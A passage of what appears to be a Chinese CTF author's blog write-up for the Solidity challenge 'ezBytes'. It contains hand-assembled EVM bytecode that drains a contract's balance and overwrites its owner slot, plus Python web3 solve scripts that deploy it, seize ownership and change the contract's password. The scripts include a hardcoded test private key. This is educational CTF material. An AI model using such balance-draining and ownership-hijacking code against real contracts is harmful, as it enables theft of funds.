+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">CALLER           <span class="hljs-regexp">//</span>把调用者地址压入栈 <br>PUSH2 <span class="hljs-number">0</span>x0000     <span class="hljs-regexp">//</span> 将<span class="hljs-number">0</span>x0000压入栈<br>SSTORE           <span class="hljs-regexp">//</span> 存储数据到状态变量<br></code></pre></td></tr></table></figure>
+
+<p>综合一下总体的字节码</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">PUSH2</span> <span class="hljs-number">0</span>x0000<br><span class="hljs-attribute">PUSH2</span> <span class="hljs-number">0</span>x0000<br><span class="hljs-attribute">PUSH2</span> <span class="hljs-number">0</span>x0000<br><span class="hljs-attribute">PUSH2</span> <span class="hljs-number">0</span>x0000<br><span class="hljs-attribute">SELFBALANCE</span><br><span class="hljs-attribute">PUSH2</span> <span class="hljs-number">0</span>x0000<br><span class="hljs-attribute">PUSH2</span> <span class="hljs-number">0</span>x0000<br><span class="hljs-attribute">CALL</span><br></code></pre></td></tr></table></figure>
+
+<p>最后需要加上常规的合约准备工作,把后面需要的25字节的字节码拷贝到内存，这25字节也是后续题目合约的内联汇编中通过extcodesize以及extcodecopy能接触到的字节码</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs awk">PUSH1 <span class="hljs-number">0</span>x19         <span class="hljs-regexp">//</span> 将<span class="hljs-number">0</span>x19压入栈<br>DUP1              <span class="hljs-regexp">//</span> 复制栈顶元素<br>PUSH1 <span class="hljs-number">0</span>x09         <span class="hljs-regexp">//</span> 将<span class="hljs-number">0</span>x09压入栈<br>RETURNDATASIZE    <span class="hljs-regexp">//</span> 获取上一个外部调用的返回数据的大小,防止覆盖<br>CODECOPY          <span class="hljs-regexp">//</span> 将合约代码拷贝到内存 <br>RETURNDATASIZE    <span class="hljs-regexp">//</span> 获取返回数据的大小<br>F3  *RETURN           <span class="hljs-regexp">//</span> 返回<br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p>这里其实就是把0x09后的25字节拷贝的内存中，而上面的准备部分刚好是9个字节</p>
+<p>这一段是在合约部署的时候执行的</p>
+</blockquote>
+<h3 id="部署slover合约"><a href="#部署slover合约" class="headerlink" title="部署slover合约"></a>部署slover合约</h3><p>slover合约是一个工具人合约，用来被上面的字节码替换，部署的话得使用python脚本</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">from</span> web3 <span class="hljs-keyword">import</span> Web3<br><span class="hljs-keyword">from</span> solcx <span class="hljs-keyword">import</span> compile_files, install_solc<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> bytes_to_long<br><br><br><span class="hljs-comment"># HTTPProvider:</span><br>w3 = Web3(Web3.HTTPProvider(<span class="hljs-string">&#x27;http://43.143.170.225:20001&#x27;</span>))<br><span class="hljs-keyword">assert</span>(w3.is_connected())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">create_new_account</span>():<br>    keys = w3.eth.account.create()<br>    address = w3.to_checksum_address(keys.address)<br>    privateKey = <span class="hljs-built_in">hex</span>(bytes_to_long(keys.key))<br>    <span class="hljs-keyword">return</span> (address, privateKey)<br><br><br>privateKey = <span class="hljs-string">&#x27;xxxxxxxxxxxxxxxxxx&#x27;</span><br>account = w3.eth.account.from_key(privateKey)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;player_address: &#x27;</span> + account.address)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">send_transaction</span>(<span class="hljs-params">account, func, args=(<span class="hljs-params"></span>)</span>):<br>    nonce = w3.eth.get_transaction_count(account.address)<br>    txn = func(*args).build_transaction(&#123;<br>        <span class="hljs-string">&#x27;from&#x27;</span>: account.address,<br>        <span class="hljs-string">&quot;gasPrice&quot;</span>: w3.eth.gas_price,<br>        <span class="hljs-string">&#x27;nonce&#x27;</span>: nonce<br>    &#125;)<br>    signed_txn = w3.eth.account.sign_transaction(txn, account.key)<br>    txn_hash = w3.eth.send_raw_transaction(signed_txn.rawTransaction)<br>    txn_receipt = w3.eth.wait_for_transaction_receipt(txn_hash)<br>    <span class="hljs-keyword">return</span> txn_receipt<br><br>install_solc(version=<span class="hljs-string">&quot;0.7.2&quot;</span>)<br>compiled_sol = compile_files(<span class="hljs-string">&#x27;Chall.sol&#x27;</span>, output_values=[<span class="hljs-string">&#x27;abi&#x27;</span>, <span class="hljs-string">&#x27;bin&#x27;</span>], solc_version=<span class="hljs-string">&quot;0.7.2&quot;</span>)<br><br><br>challenge_address = <span class="hljs-string">&#x27;xxxxxxxxxxxxxxxxxx&#x27;</span><br>challenge_abi = compiled_sol[<span class="hljs-string">&#x27;Chall.sol:ezBytes&#x27;</span>][<span class="hljs-string">&#x27;abi&#x27;</span>]<br>challenge_contract = w3.eth.contract(address=challenge_address, abi=challenge_abi)<br><br>contract_interface = compiled_sol[<span class="hljs-string">&#x27;Chall.sol:Solver&#x27;</span>]<br>solver_abi = contract_interface[<span class="hljs-string">&#x27;abi&#x27;</span>]<br>solver_bytecode = <span class="hljs-string">&#x27;60198060093d393df3610000610000610000610000473361000055610000610000f1&#x27;</span><br>solver_contract = w3.eth.contract(abi=solver_abi, bytecode=solver_bytecode)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Creating solver contract...&#x27;</span>)<br>solver_address = send_transaction(account, solver_contract.constructor).contractAddress<br><span class="hljs-built_in">print</span>(solver_address)<br></code></pre></td></tr></table></figure>
+
+<p>运行得到slover合约地址,可以使用Remix IDE直接调用challenge函数</p>
+<p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202311290241555.png" srcset="/img/loading.gif" lazyload alt="image-20231129023343884"></p>
+<p>现在check函数已经返回了true，说吗合约内余额已清空，再查看合约所有者，也更改成当前账户</p>
+<p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202311290241294.png" srcset="/img/loading.gif" lazyload alt="image-20231129023536722"></p>
+<p>现在已经可以调用changePassword来修改密码了,注意要输入16进制修饰，完整的32字节 0x3232323232323232323232323232000000000000000000000000000000000000</p>
+<p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202311290241535.png" srcset="/img/loading.gif" lazyload alt="image-20231129023719689"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202311290241783.png" srcset="/img/loading.gif" lazyload alt="image-20231129023912725"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202311290241156.png" srcset="/img/loading.gif" lazyload alt="image-20231129024003714"></p>
+<h2 id="0x03-一把梭脚本"><a href="#0x03-一把梭脚本" class="headerlink" title="0x03 一把梭脚本"></a>0x03 一把梭脚本</h2><p>需要手动替换题目地址和私钥</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">from</span> web3 <span class="hljs-keyword">import</span> Web3<br><span class="hljs-keyword">from</span> solcx <span class="hljs-keyword">import</span> compile_files, install_solc<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> bytes_to_long<br><br><br><span class="hljs-comment"># HTTPProvider:</span><br>w3 = Web3(Web3.HTTPProvider(<span class="hljs-string">&#x27;http://43.143.170.225:20001&#x27;</span>))<br><span class="hljs-keyword">assert</span>(w3.is_connected())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">create_new_account</span>():<br>    keys = w3.eth.account.create()<br>    address = w3.to_checksum_address(keys.address)<br>    privateKey = <span class="hljs-built_in">hex</span>(bytes_to_long(keys.key))<br>    <span class="hljs-keyword">return</span> (address, privateKey)<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">address, privateKey = create_new_account()</span><br><span class="hljs-string">print(privateKey)</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br>privateKey = <span class="hljs-string">&#x27;0x5bc768688b09f8df514db9f99214bc7ecf6c7772a7bb9a61e1d4430e621044a2&#x27;</span><br>account = w3.eth.account.from_key(privateKey)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;player_address: &#x27;</span> + account.address)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">send_transaction</span>(<span class="hljs-params">account, func, args=(<span class="hljs-params"></span>)</span>):<br>    nonce = w3.eth.get_transaction_count(account.address)<br>    txn = func(*args).build_transaction(&#123;<br>        <span class="hljs-string">&#x27;from&#x27;</span>: account.address,<br>        <span class="hljs-string">&quot;gasPrice&quot;</span>: w3.eth.gas_price,<br>        <span class="hljs-string">&#x27;nonce&#x27;</span>: nonce<br>    &#125;)<br>    signed_txn = w3.eth.account.sign_transaction(txn, account.key)<br>    txn_hash = w3.eth.send_raw_transaction(signed_txn.rawTransaction)<br>    txn_receipt = w3.eth.wait_for_transaction_receipt(txn_hash)<br>    <span class="hljs-keyword">return</span> txn_receipt<br><br>install_solc(version=<span class="hljs-string">&quot;0.7.2&quot;</span>)<br>compiled_sol = compile_files(<span class="hljs-string">&#x27;Chall.sol&#x27;</span>, output_values=[<span class="hljs-string">&#x27;abi&#x27;</span>, <span class="hljs-string">&#x27;bin&#x27;</span>], solc_version=<span class="hljs-string">&quot;0.7.2&quot;</span>)<br><br><br>challenge_address = <span class="hljs-string">&#x27;0x7E289572f980aA581d5811cEA39e5dC9fc182e79&#x27;</span><br>challenge_abi = compiled_sol[<span class="hljs-string">&#x27;Chall.sol:ezBytes&#x27;</span>][<span class="hljs-string">&#x27;abi&#x27;</span>]<br>challenge_contract = w3.eth.contract(address=challenge_address, abi=challenge_abi)<br><span class="hljs-comment">#if challenge_contract.functions.isSolved().call():</span><br><span class="hljs-comment">#    print(&#x27;Already solved.&#x27;)</span><br><span class="hljs-comment">#    exit(0)</span><br><br>contract_interface = compiled_sol[<span class="hljs-string">&#x27;Chall.sol:Solver&#x27;</span>]<br>solver_abi = contract_interface[<span class="hljs-string">&#x27;abi&#x27;</span>]<br>solver_bytecode = <span class="hljs-string">&#x27;60198060093d393df3610000610000610000610000473361000055610000610000f1&#x27;</span><br>solver_contract = w3.eth.contract(abi=solver_abi, bytecode=solver_bytecode)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Creating solver contract...&#x27;</span>)<br>solver_address = send_transaction(account, solver_contract.constructor).contractAddress<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Done, solver_address: &#x27;</span> + solver_address)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Solving...&#x27;</span>)<br>send_transaction(account, challenge_contract.functions.challenge, (solver_address, ))<br><br><span class="hljs-keyword">if</span> challenge_contract.functions.check().call():<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Solved&#x27;</span>)<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Error&#x27;</span>)<br>send_transaction(account, challenge_contract.functions.changePassword, (<span class="hljs-string">&quot;0x3232323232323232323232323232000000000000000000000000000000000000&quot;</span>, ))<br><span class="hljs-keyword">if</span> challenge_contract.functions.isSolved().call():<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Success&#x27;</span>)<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;No&#x27;</span>)<br></code></pre></td></tr></table></figure>
+
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/ETH/" class="category-chain-item">ETH</a>
+  
+  
+    <span>></span>
+    
+  <a href="/categories/ETH/ctf/" class="category-chain-item">ctf</a>
+  
+  
+
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/solidity/">#solidity</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>ezBytes-出题记录/wp</div>
+      <div>http://sloth31.github.io/2023/10/02/ezBytes-出题记录-wp/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Sl0th</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2023年10月2日</div>
+        </div>
+      
+      
+      <div class="license-meta-item">
+        <div>许可协议</div>
+        <div>
+          
+            
+            
+              <a target="_blank" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">
+              <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                <i class="iconfont icon-by"></i>
+              </span>
+              </a>
+            
+              <a target="_blank" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">
+              <span class="hint--top hint--rounded" aria-label="NC - 非商业性使用">
+                <i class="iconfont icon-nc"></i>
+              </span>
+              </a>
+            
+              <a target="_blank" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">
+              <span class="hint--top hint--rounded" aria-label="SA - 相同方式共享">
+                <i class="iconfont icon-sa"></i>
+              </span>
+              </a>
+            
+          
+        </div>
+      </div>
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2023/10/17/%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90-%E6%8C%87%E9%92%88%E5%88%86%E6%9E%90/" title="软件分析-指针分析">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">软件分析-指针分析</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/09/23/%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90-%E8%BF%87%E7%A8%8B%E9%97%B4%E5%88%86%E6%9E%90/" title="软件分析-过程间分析">
+                        <span class="hidden-mobile">软件分析-过程间分析</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="leancloud-site-pv-container" style="display: none">
+        总访问量 
+        <span id="leancloud-site-pv"></span>
+         次
+      </span>
+    
+    
+      <span id="leancloud-site-uv-container" style="display: none">
+        总访客数 
+        <span id="leancloud-site-uv"></span>
+         人
+      </span>
+    
+    
+
+  
+</div>
+
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      headingSelector : CONFIG.toc.headingSelector || 'h1,h2,h3,h4,h5,h6',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      collapseDepth   : CONFIG.toc.collapseDepth || 0,
+      scrollSmooth    : true,
+      headingsOffset  : -boardTop
+    });
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.10/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script defer src="/js/leancloud.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
